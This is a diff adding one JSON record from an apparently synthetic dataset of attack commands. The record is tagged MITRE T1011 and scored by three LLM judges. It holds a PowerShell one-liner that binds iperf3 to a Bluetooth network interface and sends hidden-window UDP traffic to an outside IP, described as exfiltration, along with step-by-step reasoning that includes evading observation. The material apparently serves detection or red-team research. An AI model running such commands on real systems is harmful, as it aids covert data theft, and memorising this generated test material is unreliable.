@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
+  "explanation": "Binds iperf3 to the Bluetooth PAN interface and exfiltrates over an uncommon UDP port, leveraging Bluetooth as an alternate medium per T1011.",
+  "rationale_steps": [
+    "Identify the Bluetooth PAN interface.",
+    "Retrieve the IPv4 address assigned to the Bluetooth interface.",
+    "Launch iperf3 bound to that interface using a high, uncommon UDP port.",
+    "Run the transfer in a hidden window to reduce casual observation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-1a31ae00",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, proper statement separators, valid cmdlet parameters, and correct variable interpolation.",
+        "semantic_score": 3,
+        "semantic_justification": "It binds iperf3 to the Bluetooth PAN IP to send UDP traffic, but iperf3 does not transfer arbitrary data and success depends on interface presence and routing, so it only partially fulfills the exfiltration claim.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:02:56.326362Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignments, error handling with -ErrorAction, and proper command chaining using semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by identifying the Bluetooth network adapter, obtaining its IP address, and using iperf3 to exfiltrate data over this alternate network medium on an uncommon UDP port (55222) in a hidden window.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:03:00.849683Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, uses correct cmdlet syntax, variable assignments, property access, and `Start-Process` with a properly formatted `ArgumentList` for the external executable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the claimed intent by identifying a Bluetooth network adapter, retrieving its IP, and then using `iperf3` to send UDP traffic bound specifically to that Bluetooth interface's IP, effectively leveraging Bluetooth as an alternate medium for simulated exfiltration as described in T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:22:48.593974Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
